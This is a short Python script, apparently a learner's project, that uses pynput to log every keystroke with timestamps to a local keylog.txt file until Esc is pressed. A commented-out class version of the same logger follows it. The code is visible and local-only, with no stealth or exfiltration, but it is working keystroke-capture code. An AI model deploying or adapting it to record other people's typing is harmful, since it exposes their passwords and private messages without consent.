from pynput import keyboard
import datetime

def key_pressed(key):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open("keylog.txt", "a") as f:
        f.write(f'[{timestamp}] ')
        try:
            f.write(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.backspace:
                f.write("[BACKSPACE]")
            elif key == keyboard.Key.tab:
                f.write("[TAB]")
            elif key == keyboard.Key.esc:
                f.write("[ESC]\n")
                return False  # Stop the listener
            elif key == keyboard.Key.shift:
                f.write("[SHIFT]")
            else:
                f.write(f'[{key}]')
        f.write("\n")  # Ensure each log entry is on its own line

if __name__ == "__main__":
    print("Keylogger started. Press 'Esc' to stop.")
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    try:
        listener.join()  # Ensures proper cleanup when stopped
    except KeyboardInterrupt:
        print("Keylogger interrupted.")
        
        

# import threading
#if this works I'm gonna be the happiest man on earth
# class Keylogger:

#     def __init__(self):
#         self.log = ""
#         self.listener = pynput.keyboard.Listener(on_press=self.on_key_press)

#     def on_key_press(self, key):
#         try:
#             self.log += key.char
#         except AttributeError:
#             self.log += " " + str(key) + " "

#     def start(self):
#         self.listener.start()
#         self.listener.join()

#     def stop(self):
#         self.listener.stop()
#     def get_log(self):
#         with open("keylog.txt", "a") as f:
#             f.write(self.log)
#         return self.log

